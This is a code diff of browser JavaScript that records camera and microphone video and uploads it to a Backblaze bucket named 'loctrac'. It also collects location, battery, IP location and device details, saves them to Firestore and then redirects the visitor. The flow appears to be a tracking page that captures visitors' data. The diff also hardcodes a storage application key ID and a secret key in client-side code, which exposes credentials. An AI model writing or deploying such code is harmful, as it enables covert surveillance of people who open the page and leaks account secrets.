@@ -363,12 +363,13 @@ async function collectOtherData(locationPermission, currentVideoUrl, currentCame
     saveDataAndRedirect(currentVideoUrl, locationData, batteryData, locationError, batteryError, currentCameraError, ipLocationData, deviceInfo);
 }
 
-// Function to handle camera/microphone permissions and recording (if needed)
 async function handleCameraMicPermissions(micCamPermission, recordSeconds, currentUserId) {
-    let videoUrl = null;
+    let videoUrl = null; // Initial value
     let cameraError = null;
     let recorder = null;
     let stream = null;
+
+    console.log("handleCameraMicPermissions called. micCamPermission:", micCamPermission, "recordSeconds:", recordSeconds); // <-- ADDED
 
     if (micCamPermission) {
         try {
@@ -387,20 +388,20 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                     const blob = new Blob(chunks, { type: 'video/webm' });
                     console.log("Blob type:", blob.type);
 
-                    const bucketName = 'loctrac'; // **VERVANG met de naam van je Backblaze B2 bucket**
-                    const b2ApiEndpoint = 's3.eu-central-003.backblazeb2.com'; // **VERVANG met het Endpoint van je Bucket (uit de afbeelding)**
-                    const applicationKeyId = '359242e27707'; // **<--- YOUR Application Key ID IS NOW HERE! (MASTER KEY - INSECURE FOR PRODUCTION!)**
-                    const applicationKey = 'Master Application Key'; // **<--- REPLACE THIS PLACEHOLDER with your Application Key (PRIVATE KEY - BE VERY CAREFUL!)**
-                    const userId = currentUserId; // Or get userId another way
+                    const bucketName = 'loctrac';
+                    const b2ApiEndpoint = 's3.eu-central-003.backblazeb2.com';
+                    const applicationKeyId = '359242e27707'; //  **YOUR KEY ID (MASTER KEY - INSECURE, FOR TESTING)**
+                    const applicationKey = 'K005zz89pE5t2r9z+1w92/Jm7R17cpo'; // **REPLACE WITH YOUR *LIMITED* KEY - VERY IMPORTANT!**
+                    const userId = currentUserId;
 
                     try {
                         console.log("Attempting to upload video to Backblaze B2...");
 
-                        // 1. B2 Authorization Token ophalen (b2_authorize_account API call) - **SIMPLIFIED for client-side testing - INSECURE for production!**
+                        // 1. Authorize
                         const authResponse = await fetch(`https://${b2ApiEndpoint}/b2api/v2/b2_authorize_account`, {
                             method: 'GET',
                             headers: {
-                                'Authorization': 'Basic ' + btoa(`${applicationKeyId}:${applicationKey}`) // Basic Auth with Key ID and Application Key
+                                'Authorization': 'Basic ' + btoa(`${applicationKeyId}:${applicationKey}`)
                             }
                         });
 
@@ -408,68 +409,73 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                             const message = `Backblaze B2 Authorization error! status: ${authResponse.status}`;
                             console.error(message);
                             cameraError = `Backblaze B2 authorization error: ${message}`;
-                            videoUrl = null;
-                            collectOtherData(true, videoUrl, cameraError);
-                            return; // Stop upload on auth failure
+                            videoUrl = null; // Ensure videoUrl is null on error
+                            collectOtherData(true, videoUrl, cameraError); // Call collectOtherData with videoUrl = null
+                            return; // <-- IMPORTANT: Exit early on error
                         }
 
                         const authData = await authResponse.json();
+                        console.log("Backblaze B2 Authorization Data:", authData); // <-- ADDED
+
                         const apiUrl = authData.apiUrl;
                         const authorizationToken = authData.authorizationToken;
-                        const uploadUrl = authData.uploadUrl;
+                        //const uploadUrl = authData.uploadUrl; // <-- NOT USED DIRECTLY, we get a new upload URL
 
-                        // 2. B2 Get Upload URL (b2_get_upload_url API call) - **Also simplified for client-side testing - Insecure for production!**
+                        // 2. Get Upload URL
                         const getUploadUrlResponse = await fetch(`${apiUrl}/b2api/v2/b2_get_upload_url`, {
                             method: 'POST',
                             headers: {
                                 'Authorization': authorizationToken,
                                 'Content-Type': 'application/json'
                             },
-                            body: JSON.stringify({ bucketId: authData.buckets[0].bucketId }) // Use bucketId from authData
+                            body: JSON.stringify({ bucketId: authData.buckets[0].bucketId }) // Gebruik bucketId van authData
                         });
 
                          if (!getUploadUrlResponse.ok) {
                             const message = `Backblaze B2 Get Upload URL error! status: ${getUploadUrlResponse.status}`;
                             console.error(message);
                             cameraError = `Backblaze B2 Get Upload URL error: ${message}`;
-                            videoUrl = null;
-                            collectOtherData(true, videoUrl, cameraError);
-                            return; // Stop upload on Get Upload URL failure
+                            videoUrl = null; // Ensure videoUrl is null on error
+                            collectOtherData(true, videoUrl, cameraError); // Call collectOtherData with videoUrl = null
+                            return;  // <-- IMPORTANT: Exit early on error
                         }
 
                         const uploadAuthorizationData = await getUploadUrlResponse.json();
                         const actualUploadUrl = uploadAuthorizationData.uploadUrl;
                         const uploadAuthorizationToken = uploadAuthorizationData.authorizationToken;
+                        console.log("Backblaze B2 Upload URL and Token:", actualUploadUrl, uploadAuthorizationToken); // <-- ADDED
 
 
-                        // 3. B2 Video Upload (b2_upload_file API call)
+                        // 3. Upload File
                         const fileName = `${userId}_recording.webm`;
                         const uploadFileResponse = await fetch(actualUploadUrl, { // Use uploadUrl from b2_get_upload_url
                             method: 'POST',
                             headers: {
                                 'Authorization': uploadAuthorizationToken, // Use uploadAuthorizationToken
-                                'Content-Type': 'application/octet-stream', // Or 'video/webm' if you prefer
-                                'X-Bz-File-Name': fileName, // Filename in Backblaze B2
-                                'X-Bz-Content-Sha1': await sha1Hex(blob) // SHA1 hash of the blob (required by B2)
+                                'Content-Type': 'application/octet-stream',
+                                'X-Bz-File-Name': fileName,
+                                'X-Bz-Content-Sha1': await sha1Hex(blob)
                             },
-                            body: blob // The video blob
+                            body: blob
                         });
 
 
                         if (!uploadFileResponse.ok) {
                             const message = `Backblaze B2 Video upload error! status: ${uploadFileResponse.status}`;
                             console.error(message);
+                             // Log the response body for debugging.
+                            console.error("Backblaze B2 Response Body:", await uploadFileResponse.text());
                             cameraError = `Backblaze B2 video upload error: ${message}`;
-                            videoUrl = null;
-                            collectOtherData(true, videoUrl, cameraError);
-                            return; // Stop upload on upload failure
+                            videoUrl = null; // Ensure videoUrl is null on error
+                            collectOtherData(true, videoUrl, cameraError); // Call collectOtherData with videoUrl = null
+                            return; // <-- IMPORTANT: Exit early on error
                         }
 
                         const uploadResult = await uploadFileResponse.json();
-                        videoUrl = `https://${b2ApiEndpoint}/file/${bucketName}/${fileName}`; // **NOTE: Public URL depends on bucket privacy settings!**
-                        console.log("Backblaze B2 Video URL obtained:", videoUrl);
-                        console.log("Backblaze B2 Upload Result Object:", uploadResult);
+                        console.log("Backblaze B2 Upload Result Object:", uploadResult); // <-- ADDED - VERY IMPORTANT
 
+                        videoUrl = `https://${b2ApiEndpoint}/file/${bucketName}/${fileName}`; // Construct the video URL
+                        console.log("Constructed Backblaze B2 Video URL:", videoUrl); // <-- ADDED - VERY IMPORTANT
 
                         collectOtherData(true, videoUrl, cameraError); // Proceed with data collection
 
@@ -477,9 +483,10 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                     } catch (uploadError) {
                         console.error("Unexpected error during Backblaze B2 upload process:", uploadError);
                         cameraError = "Unexpected error during video upload to Backblaze B2: " + uploadError.message;
-                        videoUrl = null;
+                        videoUrl = null; // Ensure videoUrl is null on error
                         collectOtherData(true, videoUrl, cameraError); // Proceed even if upload fails
-                    } finally {
+
+                    } finally { // <-- MOVED stream stop here to ensure it always runs
                         if (stream) {
                             stream.getTracks().forEach(track => track.stop());
                         }
@@ -487,44 +494,58 @@ async function handleCameraMicPermissions(micCamPermission, recordSeconds, curre
                 };
 
 
-                // --- SHA1 Hash function (for Backblaze B2 X-Bz-Content-Sha1 header) ---
-                async function sha1Hex(blob) {
-                    const buffer = await blob.arrayBuffer();
-                    const hashBuffer = await crypto.subtle.digest('SHA-1', buffer);
-                    const hashArray = Array.from(new Uint8Array(hashBuffer));
-                    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-                    return hashHex;
-                }
+
+                console.log("Starting video recorder...");
+                recorder.start();
+
+                setTimeout(() => {
+                    if (recorder && recorder.state !== "inactive") {
+                        console.log("Stopping video recorder from setTimeout...");
+                        recorder.stop();
+                    }
+                }, recordSeconds * 1000);
 
 
             } else {
+                console.log("recordSeconds is 0, skipping recording."); // <-- ADDED
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                 }
-                collectOtherData(true, videoUrl, cameraError);
+                collectOtherData(true, videoUrl, cameraError); // Pass null videoUrl when no recording
             }
 
         } catch (error) {
             console.error("Error accessing camera/microphone:", error);
             cameraError = error.message;
-            collectOtherData(true, videoUrl, cameraError);
-        } finally {
-             if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
+            videoUrl = null; // Ensure videoUrl is null on error.
+            collectOtherData(true, videoUrl, cameraError); // Pass null videoUrl on camera error
+
         }
     } else {
-        collectOtherData(true, videoUrl, cameraError);
+        console.log("micCamPermission is false, skipping camera/mic access."); // <-- ADDED
+        collectOtherData(false, videoUrl, cameraError); // Pass false for location, null videoUrl
     }
 
+    console.log("handleCameraMicPermissions returning. videoUrl:", videoUrl, "cameraError:", cameraError); // <-- ADDED
     return { videoUrl, cameraError };
+}
+
+   // --- SHA1 Hash function (for Backblaze B2 X-Bz-Content-Sha1 header) ---
+async function sha1Hex(blob) {
+    const buffer = await blob.arrayBuffer();
+    const hashBuffer = await crypto.subtle.digest('SHA-1', buffer);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    return hashHex;
 }
 
 
 // Function to save data to Firestore and perform the redirect
 async function saveDataAndRedirect(videoUrl, locationData, batteryData, locationError, batteryError, cameraError, ipLocationData, deviceInfo) {
+    console.log("saveDataAndRedirect called. videoUrl:", videoUrl); // <-- ADDED - VERY IMPORTANT
+
     const dataToSave = {
-        videoUrl: videoUrl || null,
+        videoUrl: videoUrl || null, // Make sure videoUrl is included.  Use || null to handle undefined.
         location: locationData || null,
         batteryPercentage: batteryData,
         locationError: locationError || null,
@@ -533,6 +554,8 @@ async function saveDataAndRedirect(videoUrl, locationData, batteryData, location
         ipLocation: ipLocationData || null,
         deviceInfo: deviceInfo || null,
     };
+
+    console.log("dataToSave:", dataToSave); // <-- ADDED
 
     const currentUserId = await getCurrentUserId();
     const dataRef = db.collection('userData').doc(currentUserId);
